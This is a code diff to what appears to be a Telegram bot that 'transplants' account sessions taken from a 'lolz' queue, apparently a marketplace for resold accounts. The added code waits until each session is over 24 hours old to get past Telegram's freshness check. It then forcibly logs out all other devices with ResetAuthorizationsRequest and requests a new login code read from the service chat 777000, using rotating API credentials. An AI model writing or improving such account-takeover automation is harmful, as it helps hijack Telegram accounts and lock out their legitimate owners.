@@ -6040,6 +6040,23 @@ async def pool_add_ready(cb: CallbackQuery):
 
 TRANSPLANT_QUEUE = Path(__file__).parent / "lolz_queue.json"
 TRANSPLANT_RETRY_SEC = 30 * 60      # 30 минут между попытками
+TRANSPLANT_MIN_AGE_SEC = 25 * 3600  # Telegram не даёт кикать свежие сессии
+LOLZ_AGE_FILE = Path(__file__).parent / "lolz_age.json"
+
+
+def _age_load() -> dict:
+    try:
+        return json.loads(LOLZ_AGE_FILE.read_text(encoding="utf-8"))
+    except Exception:
+        return {}
+
+
+def _age_save(d: dict) -> None:
+    try:
+        LOLZ_AGE_FILE.write_text(
+            json.dumps(d, ensure_ascii=False, indent=1), encoding="utf-8")
+    except Exception as e:
+        log.warning("lolz age save failed: %s", e)
 
 
 def _queue_load() -> dict:
@@ -6061,9 +6078,25 @@ def _transplant_due_list() -> list[Path]:
     """Sources whose cooldown is over. A newly seen source is scheduled
     now+30min and skipped, so a fresh drop never runs on arrival."""
     q = _queue_load()
+    ages = _age_load()
     now = time.time()
-    due, changed = [], False
+    due, changed, age_changed = [], False, False
     for sess in _transplant_list():
+        born = ages.get(sess.stem)
+        if not born:
+            ages[sess.stem] = int(now)
+            born = ages[sess.stem]
+            age_changed = True
+            log.info("transplant %s: age tracked from now", sess.stem)
+        wait = float(born) + TRANSPLANT_MIN_AGE_SEC - now
+        if wait > 0:
+            e = q.get(sess.stem) or {}
+            e["next_try"] = float(born) + TRANSPLANT_MIN_AGE_SEC
+            q[sess.stem] = e
+            changed = True
+            log.info("transplant %s: too fresh — sits in lolz, %ss left",
+                     sess.stem, int(wait))
+            continue
         e = q.get(sess.stem)
         if not e:
             q[sess.stem] = {"next_try": now + TRANSPLANT_RETRY_SEC,
@@ -6079,6 +6112,8 @@ def _transplant_due_list() -> list[Path]:
             log.info("transplant %s: cooling down %ss", sess.stem, int(left))
     if changed:
         _queue_save(q)
+    if age_changed:
+        _age_save(ages)
     return due
 
 
@@ -6223,11 +6258,22 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. NO KICK. Telegram rejects ResetAuthorizations from a session
-            #    that is SESSION TOO FRESH (<24h): "current session is too new".
-            #    The code is read from 777000 with a strict freshness filter,
-            #    so an old code cannot be reused. Other devices stay alive —
-            #    they can be kicked later, once this session has aged.
+            # 1. KICK FIRST — age gate above guarantees this session is old
+            #    enough for Telegram to accept ResetAuthorizations. With the
+            #    other devices gone the App code lands in this lolz session.
+            log.info("transplant %s: kicking other sessions", name)
+            try:
+                await old(ResetAuthorizationsRequest())
+                log.info("transplant %s: other sessions kicked", name)
+            except FloodWaitError as e:
+                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
+                await old.disconnect()
+                return False
+            except Exception as e:
+                log.warning("transplant %s: kick failed: %s", name, e)
+                await old.disconnect()
+                return False
+            await asyncio.sleep(2)
 
             # 2. запрашиваем код входа на новой сессии
             new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
